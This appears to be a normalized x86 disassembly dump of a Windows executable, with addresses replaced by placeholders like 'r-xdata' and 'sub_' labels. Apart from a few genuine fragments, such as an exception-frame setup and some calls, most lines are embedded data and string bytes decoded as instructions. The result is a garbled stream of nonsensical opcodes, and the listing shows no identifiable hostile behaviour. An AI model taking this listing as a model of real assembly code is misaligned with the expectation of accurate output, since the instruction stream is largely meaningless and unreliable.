call sub_405a10
sbb [ eax + eax + 0x558b0000 ] 0xfffffffc
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
je r-xdata
inc [ esi ]
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
je r-xdata
add [ eax ] al
[ eax + 0x1ff0000 ]
jns r-xdata
add [ eax + 0x4f10000a ] al
jb r-xdata
add [ eax ] al
popad
jbe r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
inc ecx
je r-xdata
pushad
add [ edi ] al
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100012 ] al
outsb
jne r-xdata
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x9c ] 0x0
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
mov esp 0xa80046ff
add [ eax ] al
[ eax + 0x1ff0000 ]
push edx
jo r-xdata
push 0x65676e61
dec esp
jns r-xdata
popad
outsb
dec esp
jns r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
lea edx [ ebp - 0x4 ]
mov [ fs : eax ] edx
push sub_47053f
call 0xffffffff83d50510
pushfd
add [ eax ] al
add [ ebx + 0x44b9fc55 ] cl
add eax 0xeee80047
push esp
stc
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
outsb
inc edx
and al 0x1
inc edi
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
stc
inc ebx
jmp sub_4039a0
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
mov ah 0x0
inc edi
add al al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax + 0x4f06000b ] al
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x65676e61
js r-xdata
js r-xdata
inc esi
outsd
jb r-xdata
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090008 ] al
outsb
sub_46f1e3
add ah dh
inc [ ecx ]
cmp [ eax ] al
inc edx
add [ eax ] dh
add [ edx ] eax
pushad
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
test al 0xed
inc esi
add [ ebp + eax + 0x4d00047 ] dh
inc edi
add al dh
jmp r-xdata
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
aam 0xf1
inc esi
add ah dl
out 0x46 eax
add [ edi ] cl
add [ ecx ] cl
dec edi
jne r-xdata
sbb al 0xf0
inc esi
add [ eax ] ah
insb
outsd
outsd
imul ebx [ eax + 0x50 ] 0xa
add [ eax ] al
adc [ eax ] al
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080005 ] al
jne r-xdata
push ebx
popad
jb r-xdata
imul ebp [ edi + 0x6e ] 0x67615073
jae r-xdata
outsd
push ecx
jne r-xdata
insd
jo r-xdata
push 0x706d6f43
insb
je r-xdata
dec edi
outsb
push ecx
jne r-xdata
dec esp
jns r-xdata
imul ebp [ esi + 0x64 ] 0xf06c7265
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f110009 ] al
outsb
insd
je r-xdata
outsb
je r-xdata
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
sub cl dh
inc esi
add [ eax - 0x77010000 ] cl
add [ eax - 0x6f010000 ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13000e ] al
outsb
dec ebp
inc ecx
push eax
dec ecx
dec esp
outsd
outsd
outsb
inc ebx
outsd
je r-xdata
add [ eax ] dh
add bh bh
jo r-xdata
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
out dx eax
inc esi
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
outsb
dec ecx
je r-xdata
or al [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ eax ]
push edx
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x6 ] si
jb r-xdata
pop es
inc ecx
push ebx
outsb
or ah dh
inc esi
add [ eax ] cl
pop es
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
dec edi
jo r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
arpl [ ebp + 0x64 ] sp
push ebx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] ecx
push ebx
je r-xdata
add bh bh
add [ eax ] eax
dec edi
jo r-xdata
or [ ecx ] 0x0
adc [ edi + 0x6e ] ecx
insd
push ebx
outsb
dec esp
jns r-xdata
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
outsd
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x69444909
jae r-xdata
outsb
push 0x61430601
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ eax ] bl
push esp
inc ebx
outsd
outsb
je r-xdata
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x706f7453
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f17000d ] al
jb r-xdata
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090007 ] al
outsb
dec esi
ja r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
nop
sbb al 0xf5
inc esi
add [ eax ] cl
adc edx [ ebx + eax * 2 + 0x6f ]
arpl [ gs : edx + eax + 0x4 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
dec esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
popad
je r-xdata
inc ebx
popad
add [ esi ] eax
outsb
je r-xdata
adc [ eax ] eax
add [ ecx ] dl
inc eax
add [ eax + r-xdata ] dl
or [ ebx ] dl
push esp
inc ebx
outsd
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah dl
adc [ eax ] eax
int3
aam 0x11
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ebx
jne r-xdata
dec esp
jns r-xdata
jbe r-xdata
jne r-xdata
popad
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0008 ] al
outsb
push edx
insd
popad
imul ebp [ esp + ebx - 0x10 ] 0x600046
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
pop es
push 0x6552080a
jae r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ebx
jne r-xdata
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
outsb
inc ecx
dec esp
jns r-xdata
add al [ esi + ecx * 2 ]
popad
insd
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
dec esi
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsd
je r-xdata
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
popad
jb r-xdata
popad
add al [ esi + ecx * 2 ]
push esp
or [ fs : ecx + 0x44 ] ecx
je r-xdata
je r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + ecx ] al
add [ eax ] bh
add bh bh
js r-xdata
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
lea eax [ eax ]
adc dh dh
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6f ] edx
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
push edx
jae r-xdata
jb r-xdata
je r-xdata
inc ebx
insb
outsd
jae r-xdata
insd
outsb
je r-xdata
inc ebx
outsd
inc edx
outsd
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push eax
jb r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
popad
jb r-xdata
insd
push eax
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push edx
jo r-xdata
insd
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
popad
outsd
outsb
jae r-xdata
push 0x61430601
jns r-xdata
add al 0x4e
outsb
jb r-xdata
or al [ edi ]
inc esi
outsd
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x7 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jo r-xdata
inc eax
add ah cl
adc [ eax ] al
lea eax [ eax ]
jl r-xdata
inc esi
add [ eax ] cl
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add al al
cmc
inc esi
add [ eax ] cl
imul esi [ ebx + 0x70 ] 0x68637461
or [ ecx + 0x44 ] ecx
dec ecx
inc esp
jo r-xdata
imul esi [ ebp ] 0x41070802
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
jns r-xdata
dec ecx
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
popad
je r-xdata
test [ ecx ] dl
inc eax
add ah dl
adc [ eax ] eax
int3
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
insb
test [ esi ] 0x8
adc al 0x54
dec ecx
je r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or cl [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
sbb dl [ ebx + eax * 2 + 0x6f ]
outsb
je r-xdata
jb r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
or [ edi + 0x6f ] dl
jb r-xdata
insd
push ebx
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc edx
outsw
jb r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ ecx ] dl
push esp
inc ebx
outsd
inc eax
add ah cl
adc [ eax ] al
nop
int3
insb
insb
outsb
je r-xdata
nop
adc bh dh
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6f ] edx
outsd
outsb
jae r-xdata
add ecx [ eax ]
pop es
inc ecx
push ebx
arpl [ gs : ecx + eax + 0x6 ] si
insd
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push edx
jo r-xdata
insd
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
jns r-xdata
inc ebx
outsd
outsb
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ edi + esi * 8 + 0x46 ] dl
add [ eax ] cl
sbb al 0x54
inc ebx
outsd
outsb
je r-xdata
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
add [ esi ] eax
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ebx
push 0x4e6b6365
popad
insd
jae r-xdata
outsb
push edi
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
push edx
jae r-xdata
or cl [ eax ]
adc [ eax ] eax
int3
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
inc esi
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ ecx ] bl
push esp
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
je r-xdata
insd
inc esi
outsd
jb r-xdata
inc ecx
push ebx
outsb
jb r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
outsb
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ecx
je r-xdata
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
add [ eax ] cl
and [ ebx + eax * 2 + 0x6f ] dl
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
inc ebx
add [ esi ] eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
je r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
inc ecx
je r-xdata
popad
outsb
push ebx
outsb
jb r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
inc ecx
je r-xdata
or cl [ edx ]
push esp
dec edi
add [ ebx + 0x46f8bcc0 ] cl
add [ eax ] cl
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
add [ eax ] cl
sbb dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add ecx [ eax ]
pop es
push 0x65
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
push esp
inc ebx
outsd
popad
jbe r-xdata
or cl [ edx ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
or [ edi + 0x6f ] dl
jb r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
je r-xdata
stc
inc esi
add ah cl
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
je r-xdata
inc ecx
dec ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
push es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
je r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
nop
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb907 ] ch
sbb [ ebx + eax * 2 + 0x6f ] dl
inc edx
outsd
outsd
insb
add [ ecx + edx - 0x10ebffc0 ] al
outsb
je r-xdata
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add [ esp + edx * 2 ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ edx - 0x2bffb907 ] bh
inc esp
insb
adc [ eax ] eax
int3
je r-xdata
inc edx
outsw
jb r-xdata
insd
inc esi
add [ ebx + 0x46f7f8c0 ] cl
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
test al 0x41
add [ eax - 0x1 ] dl
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
or [ ecx ] 0x47
add al al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
inc edx
add [ esi ] eax
inc ecx
je r-xdata
add [ eax ] al
add [ edi ] ah
inc esi
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffb8f7 ] al
add ah dl
inc ecx
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
je r-xdata
or cl [ edx ]
arpl [ edx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc esi
add ah cl
adc [ eax ] al
mov eax eax
mov esp 0x80046f8
adc [ eax ] eax
adc al 0xef
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
nop
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx 0xd40046f9
inc edx
outsw
jb r-xdata
insd
outsd
outsd
inc edx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
inc esi
add [ eax + r-xdata ] dl
or [ eax ] ah
push esp
inc ebx
outsd
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
add [ eax ] al
or [ ecx ] 0x0
pop es
dec edi
je r-xdata
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
add [ edi ] al
dec edi
outsb
push edx
jo r-xdata
mov esp 0x780046f5
add [ eax ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
jns r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
inc edx
outsw
jb r-xdata
test [ esi ] 0xff0000a8
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
adc cl [ edi + 0x6e ]
test [ esi ] 0x90
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
outsb
push edx
jo r-xdata
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
or al 0xf7
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
test [ esi ] 0xff0000b0
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
je r-xdata
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jns r-xdata
push 0x61430601
inc edx
outsd
outsd
insb
add ah cl
adc [ eax ] al
lodsb [ esi ]
cld
inc esi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
inc ecx
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
insb
insb
enter 0x46f6 0x0
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add [ ecx ] dl
inc eax
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah dl
adc [ eax ] eax
int3
adc [ eax ] al
mov eax eax
sub ch bh
inc esi
insd
add [ eax ] cl
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
inc ebx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push 0x65
popad
jbe r-xdata
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
push eax
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + ecx ] al
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
hlt
add [ gs : edx ] al
insd
arpl [ edx + ecx + 0x7 ] si
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
jae r-xdata
je r-xdata
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ esp + edi * 8 + 0x19080046 ] ch
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
outsb
inc edx
mov eax 0xc80046f8
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
jae r-xdata
je r-xdata
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
dec eax
clc
inc esi
add al al
add [ eax ] al
inc eax
add [ eax ] al
or al [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx + 0x44 ] ecx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x6 ] si
pop es
inc ecx
push ebx
outsb
jb r-xdata
add al 0x8
nop
push 0x80046fc
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
popad
jb r-xdata
inc esi
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
popad
jb r-xdata
or [ fs : ecx + 0x44 ] ecx
je r-xdata
inc esi
outsd
jb r-xdata
dec ecx
je r-xdata
insd
inc ecx
outsd
push es
insd
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
outsd
outsb
jae r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ eax ]
push edx
jae r-xdata
dec ecx
inc esp
dec edi
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc edx
outsd
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jae r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push eax
jb r-xdata
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x1dbffc0 ] cl
imul esi [ ebx + 0x70 ] 0x68637461
or [ ecx + 0x44 ] ecx
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
mov eax eax
fdiv st5
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
insd
push eax
jb r-xdata
jb r-xdata
inc ebx
jne r-xdata
insd
imul ebp [ edi + 0x6e ] 0x69444909
jae r-xdata
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
jl r-xdata
arpl [ gs : edx + eax + 0x4 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jns r-xdata
insd
or al [ edi ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
push 0x61430601
outsd
outsb
jae r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jo r-xdata
popad
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc esp
jo r-xdata
dec esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
popad
je r-xdata
inc ebx
add [ esi ] eax
arpl [ ecx + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
dec esi
inc ebx
insb
outsd
jae r-xdata
insd
add [ ebp + edi * 8 + 0x46 ] bh
add [ eax ] cl
adc al 0x54
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
inc esi
inc eax
add ah cl
adc [ eax ] al
xor al 0xff
inc esi
add [ eax ] cl
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
insb
insb
add [ ebx ] al
or [ edi ] al
jb r-xdata
jns r-xdata
dec ecx
je r-xdata
inc edx
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc esp
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
lea eax [ eax ]
aam 0xfe
inc esi
add [ eax ] cl
adc eax 0x73694454
push edx
jae r-xdata
jb r-xdata
je r-xdata
or [ 0x73694454 ] dl
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
mov eax eax
add al 0x4e
or [ edi ] al
inc ecx
push ebx
add [ edx ] al
jb r-xdata
pop es
push 0x6552080a
jae r-xdata
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x3fffc0 ] cl
inc esi
add [ eax ] cl
sbb eax 0x73694454
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push ebx
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or cl [ eax ]
push edx
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
insd
aam 0x11
imul esi [ ebx + 0x74 ] 0x6d657449
push edx
jo r-xdata
outsb
arpl [ ebp + 0x6c ] sp
